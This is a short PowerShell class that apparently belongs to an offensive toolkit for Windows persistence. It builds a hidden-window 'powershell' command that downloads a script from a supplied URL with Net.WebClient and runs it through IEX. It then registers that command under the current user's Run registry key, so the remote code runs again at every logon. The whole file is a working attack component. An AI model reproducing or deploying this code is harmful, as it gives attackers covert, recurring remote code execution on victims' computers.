Class ObfPersistenceExecuteScriptWeb8 {

    static Execute ([String]$url, [String]$rKeyName) {
        #Import Obfuscated script
        # ..\..\Download-File-Content\gen-obf\ObfDownloadFileContent8.ps1
        $DoAll = "IEX (New-Object Net.WebClient).DownloadString('$url')"
        
        #Make a payload from PayloadURL
        #Invoke expression is already included in $DoAll command
        $Payload = "powershell -win hid -noP -c `"$DoAll`""

        $runKeys = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run

        # Check if it already exists a key with the given name
        if($runKeys.$rKeyName){
            # Remove it if already exists
            Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $rKeyName
        }
        New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $rKeyName -Value $Payload

    }

}